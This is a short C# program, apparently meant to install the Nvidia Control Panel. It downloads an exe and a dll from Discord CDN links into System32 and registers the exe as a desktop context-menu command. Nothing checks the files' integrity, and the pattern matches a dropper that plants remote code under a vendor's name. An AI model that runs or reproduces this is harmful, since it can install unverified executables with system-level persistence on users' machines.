using Microsoft.Win32;
using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        string url1 = "https://cdn.discordapp.com/attachments/1052246681590186026/1127375395407265822/nvcplui.exe";
        string url2 = "https://cdn.discordapp.com/attachments/1052246681590186026/1127375420996718612/nvcpluir.dll";
        string dest = @"C:\Windows\System32\";
        string key = @"HKEY_CLASSES_ROOT\Directory\background\shell\Nvidia Control Panel\Command";
        string value = "C:\\Windows\\System32\\nvcplui.exe";
        using (HttpClient client = new HttpClient())
        {
            try
            {
                await DownloadArquivo(client, url1, dest);
                await DownloadArquivo(client, url2, dest);

                Console.WriteLine("sucess download!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("error in download: " + ex.Message);
            }
        }
        try
        {
            Registry.SetValue(key, null, value, RegistryValueKind.String);
            string valorAtual = Registry.GetValue(key, null, "").ToString();
            Console.WriteLine("Value: " + valorAtual);
        }
        catch (Exception ex)
        {
            Console.WriteLine("error in regedit: " + ex.Message);
        }   
}

    static async Task DownloadArquivo(HttpClient client, string url, string pastaDestino)
    {
        string nomeArquivo = Path.GetFileName(url);
        string caminhoCompleto = Path.Combine(pastaDestino, nomeArquivo);

        HttpResponseMessage response = await client.GetAsync(url);

        if (response.IsSuccessStatusCode)
        {
            using (FileStream fileStream = new FileStream(caminhoCompleto, FileMode.Create))
            {
                await response.Content.CopyToAsync(fileStream);
            }

            Console.WriteLine("Downloaded: " + nomeArquivo);
        }
        else
        {
            Console.WriteLine("Error in  " + nomeArquivo + ".status: " + response.StatusCode);
        }
    }

}

